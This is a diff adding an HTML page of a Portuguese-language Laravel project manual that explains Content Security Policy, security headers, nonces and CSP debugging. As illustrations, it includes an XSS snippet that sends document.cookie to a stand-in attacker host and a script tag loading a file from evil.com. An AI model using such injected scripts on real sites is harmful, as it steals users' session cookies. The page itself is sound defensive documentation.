@@ -1,0 +1,832 @@
+<!DOCTYPE html>
+<html class="scroll-smooth" lang="pt-BR" data-artifact-type="labsis-manual" data-generated-at="2026-05-27">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Content Security Policy (CSP) - Proteção Contra XSS — Manual labSIS-KIT</title>
+<link rel="stylesheet" href="../assets/labsis-manual.css"/>
+</head>
+<body class="has-sidebar docs-page">
+<div class="color-orb orb-1"></div>
+<div class="color-orb orb-2"></div>
+<div class="bg-grid"></div>
+
+<button type="button" class="sidebar-toggle" data-sidebar-open aria-label="Abrir menu de navegação" aria-controls="manual-sidebar" aria-expanded="false">
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M4 6h16M4 12h16M4 18h16"/></svg>
+<span>Menu</span>
+</button>
+<div class="sidebar-backdrop" data-sidebar-close hidden></div>
+
+<aside class="manual-sidebar" id="manual-sidebar" aria-label="Menu lateral">
+<div class="sidebar-header">
+<button type="button" class="sidebar-close" data-sidebar-close aria-label="Fechar menu">
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+<path d="M18 6 6 18M6 6l12 12"/></svg></button>
+</div>
+<nav class="sidebar-nav" aria-label="Documentação">
+<ul class="sidebar-pages">
+<li><a href="../index.html">Início do manual</a></li>
+</ul>
+<details class="sidebar-section" data-section="01-instalacao-e-setup"><summary class="sidebar-section-label">01 — Instalação e Setup</summary><ul class="sidebar-pages">
+<li><a href="../01-instalacao-e-setup/instalacao-manual.html">Instalação manual (clonando o repositório)</a></li>
+<li><a href="../01-instalacao-e-setup/instalacao-via-laravel-installer.html">Instalação via Laravel Installer</a></li>
+</ul></details>
+<details class="sidebar-section" data-section="02-autenticacao-e-seguranca" open><summary class="sidebar-section-label">02 — Autenticação e Segurança</summary><ul class="sidebar-pages">
+<li><a href="autenticacao-2fa.html">Autenticação de Dois Fatores (2FA) no Filament</a></li>
+<li><a href="checklist-de-seguranca.html">Checklist de Segurança e Diretrizes de Mitigação</a></li>
+<li><a href="content-security-policy.html" class="is-active">Content Security Policy (CSP) - Proteção Contra XSS</a></li>
+<li><a href="customizacao-emails.html">Customização de E-mails e Fluxo de Reset de Senha</a></li>
+<li><a href="fluxo-de-registro-de-novos-usuarios.html">Fluxo de Registro de Novos Usuários</a></li>
+<li><a href="fortalecimento-de-senha.html">Fortalecimento de Senha (Password Hardening)</a></li>
+<li><a href="login-unificado.html">Sistema de Login Unificado (Filament + Laravel)</a></li>
+<li><a href="prevencao-idor.html">Prevenção Contra IDOR (Insecure Direct Object Reference)</a></li>
+<li><a href="roles-e-permissions.html">Sistema de Roles e Permissions</a></li>
+<li><a href="suspensao-usuarios.html">Sistema de Suspensão de Usuários no Filament</a></li>
+<li><a href="tenancy-e-teams.html">Tenancy E Teams</a></li>
+</ul></details>
+<details class="sidebar-section" data-section="03-ui-e-customizacao"><summary class="sidebar-section-label">03 — UI e Customização</summary><ul class="sidebar-pages">
+<li><a href="../03-ui-e-customizacao/customizacao-de-cores.html">Customização de Cores e CSS Modular do Filament</a></li>
+<li><a href="../03-ui-e-customizacao/customizando-layout.html">Customização da Aparência e Plugins no Filament</a></li>
+<li><a href="../03-ui-e-customizacao/customizando-logo.html">🎨 Customizando o Logotipo nos Painéis Filament</a></li>
+<li><a href="../03-ui-e-customizacao/widgets-filament.html">Widgets no Filament — Métricas e Componentização no P…</a></li>
+</ul></details>
+<details class="sidebar-section" data-section="04-backend-e-arquitetura"><summary class="sidebar-section-label">04 — Backend e Arquitetura</summary><ul class="sidebar-pages">
+<li><a href="../04-backend-e-arquitetura/app-service-provider.html">Entendendo o AppServiceProvider</a></li>
+<li><a href="../04-backend-e-arquitetura/enums.html">Utilizando Enumerações (Enums) no Laravel com Integra…</a></li>
+<li><a href="../04-backend-e-arquitetura/estrategia-backup.html">Estratégia de Backup</a></li>
+<li><a href="../04-backend-e-arquitetura/gestao-de-midia.html">Gestao De Midia</a></li>
+<li><a href="../04-backend-e-arquitetura/mongodb-integration.html">Integração MongoDB - Auditoria e Logs</a></li>
+<li><a href="../04-backend-e-arquitetura/notifications-trait.html">NotificationsTrait - Sistema de Notificações no Filament</a></li>
+<li><a href="../04-backend-e-arquitetura/padrao-datetime.html">Padronização de Data e Hora</a></li>
+<li><a href="../04-backend-e-arquitetura/regras-de-negocio.html">Regras de Negócio: labSIS-KIT</a></li>
+<li><a href="../04-backend-e-arquitetura/scripts-composer.html">Scripts do Composer e Inicialização de Storage</a></li>
+<li><a href="../04-backend-e-arquitetura/stack-tecnologica.html">Stack Tecnológica e Versões</a></li>
+<li><a href="../04-backend-e-arquitetura/user-model.html">Arquitetura do Model User</a></li>
+</ul></details>
+<details class="sidebar-section" data-section="05-otimizacoes"><summary class="sidebar-section-label">05 — Otimizações</summary><ul class="sidebar-pages">
+<li><a href="../05-otimizacoes/cache-e-redis.html">Cache e Redis no Projeto</a></li>
+<li><a href="../05-otimizacoes/cloudflare-page-cache.html">Otimização de Cache de Página com Cloudflare</a></li>
+<li><a href="../05-otimizacoes/filament-performance.html">Performance no Filament</a></li>
+<li><a href="../05-otimizacoes/laravel-pulse.html">Laravel Pulse</a></li>
+<li><a href="../05-otimizacoes/livewire-computed.html">Livewire Computed — Otimizando Renderizações com `#[C…</a></li>
+</ul></details>
+<details class="sidebar-section" data-section="06-testes"><summary class="sidebar-section-label">06 — Testes</summary><ul class="sidebar-pages">
+<li><a href="../06-testes/01-introducao.html">🧪 Testes Automatizados</a></li>
+<li><a href="../06-testes/02-autenticacao.html">🔐 Testes de Autenticação</a></li>
+<li><a href="../06-testes/03-acesso-paineis.html">🛡️ Testes de Controle de Acesso e Redirecionamento</a></li>
+</ul></details>
+<details class="sidebar-section" data-section="07-qualidade-de-codigo"><summary class="sidebar-section-label">07 — Qualidade de Código</summary><ul class="sidebar-pages">
+<li><a href="../07-qualidade-de-codigo/01-larastan.html">Larastan: Garantindo a Integridade Técnica 🛡️</a></li>
+<li><a href="../07-qualidade-de-codigo/02-rector.html">Rector: Automação e Evolução do Código 🚀</a></li>
+<li><a href="../07-qualidade-de-codigo/03-ide-helper.html">Laravel IDE Helper: Autocompletar e Inteligência 🧠</a></li>
+<li><a href="../07-qualidade-de-codigo/04-filacheck.html">Filacheck Pro: Validação de Convenções Filament 🧩</a></li>
+</ul></details>
+<details class="sidebar-section" data-section="08-ai-agents"><summary class="sidebar-section-label">08 — AI Agents</summary><ul class="sidebar-pages">
+<li><a href="../08-ai-agents/guia-workflows.html">Guia de Workflows do Agente (Gemini)</a></li>
+<li><a href="../08-ai-agents/laravel-boost.html">Laravel Boost - MCP para Laravel</a></li>
+<li><a href="../08-ai-agents/padrao-de-skills.html">Padrão de Nomenclatura de Skills: Action-Object</a></li>
+<li><a href="../08-ai-agents/protocolo-operacional.html">PROTOCOLO DE EXECUÇÃO: INTEGRAÇÃO CONTEXTUAL DE SKILLS</a></li>
+</ul></details>
+<details class="sidebar-section" data-section="09-roadmap-futuro"><summary class="sidebar-section-label">09 — Roadmap futuro</summary><ul class="sidebar-pages">
+<li><a href="../09-roadmap-futuro/plano-laravel-passkeys-labsis.html">Plano de Integração — Laravel Passkeys no labSIS-KIT</a></li>
+</ul></details>
+</nav>
+</aside>
+
+<div class="manual-content">
+<div class="docs-layout">
+<article class="docs-main">
+<nav class="doc-breadcrumb" aria-label="Trilha"><a href="../index.html">Manual</a><span class="doc-breadcrumb-sep" aria-hidden="true">/</span><a href="index.html">Autenticação e Segurança</a><span class="doc-breadcrumb-sep" aria-hidden="true">/</span><span class="doc-breadcrumb-current">Content Security Policy (CSP) - Proteção Contra XSS</span></nav>
+<header class="doc-header">
+<p class="doc-eyebrow">02 — Autenticação e Segurança</p>
+<h1 class="doc-title">Content Security Policy (CSP) - Proteção Contra XSS</h1>
+</header>
+<div class="prose-content">
+<h2 id="o-que-é-content-security-policy">O que é Content Security Policy?</h2>
+<p>Content Security Policy (CSP) é uma camada adicional de segurança que ajuda a detectar e mitigar certos tipos de ataques, incluindo Cross-Site Scripting (XSS) e ataques de injeção de dados. O CSP funciona definindo de quais fontes o navegador pode carregar recursos como scripts, estilos, imagens e outros conteúdos.</p>
+<h3>Por que CSP é importante?</h3>
+<h4>1. <strong>Proteção contra XSS (Cross-Site Scripting)</strong></h4>
+<p>XSS é um dos ataques mais comuns na web. Atacantes injetam código JavaScript malicioso em páginas web que depois é executado no navegador de outros usuários.</p>
+<p><strong>Exemplo de ataque XSS:</strong></p>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">html</span></div><pre><code>&lt;!-- Atacante injeta esse código em um comentário ou formulário --&gt;
+&lt;script&gt;
+    // Roubar cookies de autenticação
+    fetch(&quot;https://atacante.com/steal?cookie=&quot; + document.cookie);
+&lt;/script&gt;</code></pre></div>
+<p><strong>Como CSP protege:</strong> Com CSP, você define explicitamente de onde scripts podem vir. Se um script malicioso for injetado, o navegador bloqueará sua execução.</p>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">bash</span></div><pre><code>Content-Security-Policy: script-src &#x27;self&#x27;</code></pre></div>
+<p>☝️ Permite apenas scripts do próprio domínio, bloqueando qualquer script injetado.</p>
+<h4>2. <strong>Proteção contra Clickjacking</strong></h4>
+<p>Clickjacking é quando um atacante engana o usuário a clicar em algo diferente do que está vendo, geralmente incorporando seu site em um iframe invisível.</p>
+<p><strong>Como CSP protege:</strong></p>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">bash</span></div><pre><code>Content-Security-Policy: frame-ancestors &#x27;self&#x27;</code></pre></div>
+<p>☝️ Impede que seu site seja incorporado em iframes de outros domínios.</p>
+<h4>3. <strong>Proteção contra Data Injection</strong></h4>
+<p>Atacantes podem tentar manipular URLs e formulários para realizar ataques.</p>
+<p><strong>Como CSP protege:</strong></p>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">bash</span></div><pre><code>Content-Security-Policy:
+  base-uri &#x27;self&#x27;;
+  form-action &#x27;self&#x27;</code></pre></div>
+<p>☝️ Restringe onde formulários podem ser enviados e qual base URL pode ser usada.</p>
+<p>---</p>
+<h2 id="implementação-no-labsis-kit">Implementação no labSIS-KIT</h2>
+<h3>Localização</h3>
+<p>O CSP está implementado no middleware <code>EnsureSecurityHeaders</code>:</p>
+<p>📄 <a href="/app/Http/Middleware/EnsureSecurityHeaders.php"><code>app/Http/Middleware/EnsureSecurityHeaders.php</code></a></p>
+<h3>Arquitetura da Implementação</h3>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">mermaid</span></div><pre><code>graph TD
+    A[Requisição HTTP] --&gt; B{Rota começa com /admin ou /user?}
+    B --&gt;|Sim| C[Não aplica CSP]
+    B --&gt;|Não| D{Ambiente Local?}
+    D --&gt;|Sim| E[Política CSP Development]
+    D --&gt;|Não| F[Política CSP Production]
+    C --&gt; G[Adiciona Headers Básicos]
+    E --&gt; G
+    F --&gt; G
+    G --&gt; H[Resposta HTTP]
+
+    style E fill:#90EE90
+    style F fill:#FFB6C1
+    style C fill:#FFE4B5</code></pre></div>
+<h3>Exclusão de Painéis Administrativos</h3>
+<p>O CSP <strong>não é aplicado</strong> nos painéis <code>/admin</code> e <code>/user</code> porque o Filament gerencia suas próprias políticas de segurança. O CSP é aplicado apenas em:</p>
+<ul>
+<li>✅ <strong>AuthPanel</strong> (<code>/</code>, <code>/login</code>, <code>/register</code>)</li>
+<li>✅ <strong>Rotas públicas</strong> (home, landing page)</li>
+</ul>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">php</span></div><pre><code>// Verifica se a rota NÃO é admin ou user
+if (! $request-&gt;is(&#x27;admin*&#x27;) &amp;&amp; ! $request-&gt;is(&#x27;user*&#x27;)) {
+    // Aplica CSP
+}</code></pre></div>
+<h3>Políticas CSP Configuradas</h3>
+<h4>🔧 Ambiente de Desenvolvimento</h4>
+<p>Configurado para compatibilidade total com Vite (Hot Module Replacement):</p>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">bash</span></div><pre><code>Content-Security-Policy:
+  default-src &#x27;self&#x27;;
+  script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27; http://localhost:5173;
+  style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; https://fonts.googleapis.com http://localhost:5173;
+  img-src &#x27;self&#x27; data: blob: {domínio-s3};
+  font-src &#x27;self&#x27; https://fonts.gstatic.com;
+  connect-src &#x27;self&#x27; ws://localhost:5173 http://localhost:5173;
+  media-src &#x27;self&#x27; {domínio-s3};</code></pre></div>
+<p><strong>Recursos permitidos:</strong></p>
+<ul>
+<li>✅ Scripts do próprio site e Vite dev server</li>
+<li>✅ WebSocket para HMR (Hot Module Replacement)</li>
+<li>✅ Google Fonts</li>
+<li>✅ Imagens de S3/MinIO</li>
+</ul>
+<h4>🚀 Ambiente de Produção</h4>
+<p>Mais restritivo, sem permissões de desenvolvimento:</p>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">bash</span></div><pre><code>Content-Security-Policy:
+  default-src &#x27;self&#x27;;
+  script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27;;
+  style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; https://fonts.googleapis.com;
+  img-src &#x27;self&#x27; data: blob: {domínio-s3} https://*.r2.cloudflarestorage.com;
+  font-src &#x27;self&#x27; https://fonts.gstatic.com;
+  connect-src &#x27;self&#x27;;
+  media-src &#x27;self&#x27; {domínio-s3} https://*.r2.cloudflarestorage.com;
+  frame-ancestors &#x27;self&#x27;;
+  base-uri &#x27;self&#x27;;
+  form-action &#x27;self&#x27;;</code></pre></div>
+<p><strong>Recursos permitidos:</strong></p>
+<ul>
+<li>✅ Scripts e estilos do próprio site</li>
+<li>✅ Google Fonts</li>
+<li>✅ Imagens de S3/MinIO ou Cloudflare R2</li>
+<li>✅ Proteções adicionais contra clickjacking e manipulação de formulários</li>
+</ul>
+<h3>Diretivas CSP Explicadas</h3>
+<table class="data"><thead><tr>
+<th>Diretiva</th>
+<th>Função</th>
+<th>Exemplo</th>
+</tr></thead><tbody>
+<tr>
+<td><code>default-src</code></td>
+<td>Define fonte padrão para todos os recursos</td>
+<td><code>&#x27;self&#x27;</code> = apenas do próprio domínio</td>
+</tr>
+<tr>
+<td><code>script-src</code></td>
+<td>Define de onde scripts podem ser carregados</td>
+<td><code>&#x27;self&#x27; http://localhost:5173</code></td>
+</tr>
+<tr>
+<td><code>style-src</code></td>
+<td>Define de onde estilos podem ser carregados</td>
+<td><code>&#x27;self&#x27; https://fonts.googleapis.com</code></td>
+</tr>
+<tr>
+<td><code>img-src</code></td>
+<td>Define de onde imagens podem ser carregadas</td>
+<td><code>&#x27;self&#x27; data: blob:</code></td>
+</tr>
+<tr>
+<td><code>font-src</code></td>
+<td>Define de onde fontes podem ser carregadas</td>
+<td><code>https://fonts.gstatic.com</code></td>
+</tr>
+<tr>
+<td><code>connect-src</code></td>
+<td>Define para onde requisições AJAX/WebSocket podem ser feitas</td>
+<td><code>&#x27;self&#x27; ws://localhost:5173</code></td>
+</tr>
+<tr>
+<td><code>media-src</code></td>
+<td>Define de onde áudio/vídeo podem ser carregados</td>
+<td><code>&#x27;self&#x27;</code></td>
+</tr>
+<tr>
+<td><code>frame-ancestors</code></td>
+<td>Define quem pode incorporar o site em iframe</td>
+<td><code>&#x27;self&#x27;</code> = só o próprio site</td>
+</tr>
+<tr>
+<td><code>base-uri</code></td>
+<td>Restringe URLs que podem ser usadas na tag <code>&lt;base&gt;</code></td>
+<td><code>&#x27;self&#x27;</code></td>
+</tr>
+<tr>
+<td><code>form-action</code></td>
+<td>Restringe para onde formulários podem enviar dados</td>
+<td><code>&#x27;self&#x27;</code></td>
+</tr>
+</tbody></table>
+<h3>Valores Especiais</h3>
+<table class="data"><thead><tr>
+<th>Valor</th>
+<th>Significado</th>
+</tr></thead><tbody>
+<tr>
+<td><code>&#x27;self&#x27;</code></td>
+<td>Mesmo domínio (protocolo, host e porta)</td>
+</tr>
+<tr>
+<td><code>&#x27;unsafe-inline&#x27;</code></td>
+<td>Permite scripts/estilos inline (⚠️ menos seguro)</td>
+</tr>
+<tr>
+<td><code>&#x27;unsafe-eval&#x27;</code></td>
+<td>Permite <code>eval()</code> e funções similares (⚠️ menos seguro)</td>
+</tr>
+<tr>
+<td><code>data:</code></td>
+<td>Permite URLs data: (ex: <code>data:image/png;base64,...</code>)</td>
+</tr>
+<tr>
+<td><code>blob:</code></td>
+<td>Permite URLs blob: (ex: arquivos criados em memória)</td>
+</tr>
+<tr>
+<td><code>https:</code></td>
+<td>Permite HTTPS de qualquer domínio</td>
+</tr>
+<tr>
+<td><code>*.dominio.com</code></td>
+<td>Permite todos os subdomínios</td>
+</tr>
+</tbody></table>
+<p>---</p>
+<h2 id="headers-de-segurança-adicionais">Headers de Segurança Adicionais</h2>
+<p>Além do CSP, o middleware implementa outros headers importantes:</p>
+<h3>X-Frame-Options</h3>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">bash</span></div><pre><code>X-Frame-Options: SAMEORIGIN</code></pre></div>
+<p><strong>Proteção:</strong> Impede que o site seja carregado em iframes de outros domínios (defesa contra clickjacking).</p>
+<h3>X-Content-Type-Options</h3>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">bash</span></div><pre><code>X-Content-Type-Options: nosniff</code></pre></div>
+<p><strong>Proteção:</strong> Impede que o navegador &quot;adivinhe&quot; o tipo MIME de arquivos, forçando respeitar o header <code>Content-Type</code>.</p>
+<h3>X-XSS-Protection</h3>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">bash</span></div><pre><code>X-XSS-Protection: 1; mode=block</code></pre></div>
+<p><strong>Proteção:</strong> Ativa proteção XSS do navegador (legacy, CSP é mais moderno).</p>
+<h3>Referrer-Policy</h3>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">bash</span></div><pre><code>Referrer-Policy: strict-origin-when-cross-origin</code></pre></div>
+<p><strong>Proteção:</strong> Controla quais informações de referência são enviadas em requisições.</p>
+<h3>Strict-Transport-Security (HSTS)</h3>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">bash</span></div><pre><code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code></pre></div>
+<p><strong>Proteção:</strong> Força o navegador a sempre usar HTTPS (válido por 1 ano).</p>
+<p>---</p>
+<h2 id="testando-a-implementação">Testando a Implementação</h2>
+<h3>1. Verificar Headers HTTP</h3>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">bash</span></div><pre><code># Ver todos os headers de segurança
+curl -I http://localhost
+
+# Buscar especificamente CSP
+curl -I http://localhost | grep Content-Security-Policy</code></pre></div>
+<h3>2. Verificar no Navegador</h3>
+<ol>
+<li>Acesse a aplicação (ex: <code>http://localhost/login</code>)</li>
+<li>Abra DevTools (F12)</li>
+<li>Vá para <strong>Network</strong> &gt; Clique na primeira requisição</li>
+<li>Veja a aba <strong>Headers</strong> &gt; <strong>Response Headers</strong></li>
+<li>Confirme a presença de <code>Content-Security-Policy</code></li>
+</ol>
+<h3>3. Testar Violações CSP</h3>
+<p>Para testar se o CSP está funcionando, tente injetar um script malicioso:</p>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">html</span></div><pre><code>&lt;!-- Isso deve ser BLOQUEADO pelo CSP --&gt;
+&lt;script src=&quot;https://evil.com/malicious.js&quot;&gt;&lt;/script&gt;</code></pre></div>
+<p>O navegador bloqueará e mostrará um erro no console:</p>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">bash</span></div><pre><code>Refused to load the script &#x27;https://evil.com/malicious.js&#x27; because it violates
+the following Content Security Policy directive: &quot;script-src &#x27;self&#x27; ...&quot;</code></pre></div>
+<p>---</p>
+<h2 id="configuração-de-storage-s3minio">Configuração de Storage S3/MinIO</h2>
+<p>O CSP detecta automaticamente o domínio de storage configurado:</p>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">php</span></div><pre><code>$filesDomain = config(&#x27;filesystems.disks.s3.endpoint&#x27;,
+                      config(&#x27;filesystems.disks.s3.url&#x27;));</code></pre></div>
+<p><strong>Variáveis de ambiente necessárias:</strong></p>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">env</span></div><pre><code># .env
+AWS_ENDPOINT=http://minio:9000          # Local
+AWS_URL=http://localhost:9000           # Dev
+
+# OU em produção:
+AWS_ENDPOINT=https://s3.us-east-1.amazonaws.com
+AWS_URL=https://cdn.seudominio.com</code></pre></div>
+<p>---</p>
+<h2 id="nonce-para-scripts-seguros">Nonce para Scripts Seguros</h2>
+<p>O middleware gera um <strong>nonce</strong> (número usado uma vez) para cada requisição:</p>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">php</span></div><pre><code>$nonce = base64_encode(random_bytes(16));
+app()-&gt;instance(&#x27;csp-nonce&#x27;, $nonce);</code></pre></div>
+<p><strong>Como usar em views Blade:</strong></p>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">blade</span></div><pre><code>&lt;script nonce=&quot;{{ app(&#x27;csp-nonce&#x27;) }}&quot;&gt;
+    // Código JavaScript inline seguro
+    console.log(&#x27;Este script é permitido pelo CSP&#x27;);
+&lt;/script&gt;</code></pre></div>
+<div class="callout callout-info"><p><strong>Nota:</strong> Atualmente o projeto usa <code>&#x27;unsafe-inline&#x27;</code>, o que permite scripts inline sem nonce. Para máxima segurança, considere remover <code>&#x27;unsafe-inline&#x27;</code> e usar nonces em todos os scripts.</p></div>
+<p>---</p>
+<h2 id="melhorias-futuras">Melhorias Futuras</h2>
+<h3>1. Remover <code>&#x27;unsafe-inline&#x27;</code></h3>
+<p><strong>Atual:</strong></p>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">bash</span></div><pre><code>script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27;</code></pre></div>
+<p><strong>Mais seguro:</strong></p>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">bash</span></div><pre><code>script-src &#x27;self&#x27; &#x27;nonce-{random}&#x27;</code></pre></div>
+<p>Exige adicionar nonces em todos os scripts inline.</p>
+<h3>2. Remover <code>&#x27;unsafe-eval&#x27;</code></h3>
+<p>Evite uso de <code>eval()</code>, <code>new Function()</code>, etc. no código JavaScript.</p>
+<h3>3. Implementar Relatórios CSP</h3>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">bash</span></div><pre><code>Content-Security-Policy-Report-Only: ... ; report-uri /csp-violation-report</code></pre></div>
+<p>Permite testar políticas sem bloquear recursos, apenas reportando violações.</p>
+<h3>4. Upgrade Insecure Requests</h3>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">bash</span></div><pre><code>Content-Security-Policy: upgrade-insecure-requests</code></pre></div>
+<p>Força http:// a se tornar https:// automaticamente.</p>
+<p>---</p>
+<h2 id="debugging-de-problemas-csp">Debugging de Problemas CSP</h2>
+<h3>Sintoma: Recursos bloqueados</h3>
+<p><strong>Console do navegador:</strong></p>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">bash</span></div><pre><code>Refused to load the image &#x27;https://exemplo.com/imagem.jpg&#x27; because it violates
+the following Content Security Policy directive: &quot;img-src &#x27;self&#x27;&quot;</code></pre></div>
+<p><strong>Solução:</strong> Adicione o domínio na diretiva apropriada:</p>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">php</span></div><pre><code>&quot;img-src &#x27;self&#x27; https://exemplo.com&quot;</code></pre></div>
+<h3>Sintoma: Vite HMR não funciona</h3>
+<p><strong>Problema:</strong> WebSocket do Vite é bloqueado.</p>
+<p><strong>Solução:</strong> Certifique-se de estar em ambiente local e que <code>connect-src</code> inclui:</p>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">php</span></div><pre><code>&quot;connect-src &#x27;self&#x27; ws://localhost:5173 http://localhost:5173&quot;</code></pre></div>
+<h3>Sintoma: Google Fonts não carregam</h3>
+<p><strong>Problema:</strong> Fontes externas bloqueadas.</p>
+<p><strong>Solução:</strong></p>
+<div class="terminal-block"><div class="term-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-label">php</span></div><pre><code>&quot;font-src &#x27;self&#x27; https://fonts.gstatic.com&quot;,
+&quot;style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; https://fonts.googleapis.com&quot;</code></pre></div>
+<p>---</p>
+<h2 id="referências">Referências</h2>
+<ul>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">MDN - Content Security Policy</a></li>
+<li><a href="https://csp-evaluator.withgoogle.com/">CSP Evaluator - Google</a></li>
+<li><a href="https://owasp.org/www-community/controls/Content_Security_Policy">OWASP - Content Security Policy</a></li>
+<li><a href="https://laravel.com/docs/12.x/security">Laravel Security Best Practices</a></li>
+</ul>
+<p>---</p>
+<h2 id="conclusão">Conclusão</h2>
+<p>O CSP implementado no labSIS-KIT fornece múltiplas camadas de proteção:</p>
+<p>✅ Bloqueia scripts maliciosos (XSS) ✅ Previne clickjacking ✅ Restringe fontes de recursos ✅ Compatível com Vite em desenvolvimento ✅ Não interfere com Filament Admin ✅ Suporte a storage S3/MinIO/R2</p>
+<p>Esta implementação equilibra <strong>segurança robusta</strong> com <strong>experiência de desenvolvimento fluida</strong>, mantendo o projeto protegido contra os ataques web mais comuns.</p>
+</div>
+<nav class="doc-pagination" aria-label="Navegação entre documentos"><a class="doc-pagination-card doc-pagination-prev" href="checklist-de-seguranca.html"><span class="doc-pagination-label">Anterior</span><span class="doc-pagination-title">Checklist de Segurança e Diretrizes de Mitigação</span></a><a class="doc-pagination-card doc-pagination-next" href="customizacao-emails.html"><span class="doc-pagination-label">Próximo</span><span class="doc-pagination-title">Customização de E-mails e Fluxo de Reset de Senha</span></a></nav>
+<footer class="doc-footer">
+<button type="button" class="btn btn-secondary btn-sm" id="copyMdBtn" aria-label="Copiar Markdown original">Copiar Markdown original</button>
+</footer>
+</article>
+<aside class="doc-toc-rail" aria-label="Nesta página"><p class="doc-toc-title">Nesta página</p><ul class="doc-toc-list"><li><a class="doc-toc-link" href="#o-que-é-content-security-policy" data-toc-target="o-que-é-content-security-policy">O que é Content Security Policy?</a></li>
+<li><a class="doc-toc-link" href="#implementação-no-labsis-kit" data-toc-target="implementação-no-labsis-kit">Implementação no labSIS-KIT</a></li>
+<li><a class="doc-toc-link" href="#headers-de-segurança-adicionais" data-toc-target="headers-de-segurança-adicionais">Headers de Segurança Adicionais</a></li>
+<li><a class="doc-toc-link" href="#testando-a-implementação" data-toc-target="testando-a-implementação">Testando a Implementação</a></li>
+<li><a class="doc-toc-link" href="#configuração-de-storage-s3minio" data-toc-target="configuração-de-storage-s3minio">Configuração de Storage S3/MinIO</a></li>
+<li><a class="doc-toc-link" href="#nonce-para-scripts-seguros" data-toc-target="nonce-para-scripts-seguros">Nonce para Scripts Seguros</a></li>
+<li><a class="doc-toc-link" href="#melhorias-futuras" data-toc-target="melhorias-futuras">Melhorias Futuras</a></li>
+<li><a class="doc-toc-link" href="#debugging-de-problemas-csp" data-toc-target="debugging-de-problemas-csp">Debugging de Problemas CSP</a></li>
+<li><a class="doc-toc-link" href="#referências" data-toc-target="referências">Referências</a></li>
+<li><a class="doc-toc-link" href="#conclusão" data-toc-target="conclusão">Conclusão</a></li></ul></aside>
+</div>
+</div>
+
+<script type="text/plain" id="source-markdown"># Content Security Policy (CSP) - Proteção Contra XSS
+
+## O que é Content Security Policy?
+
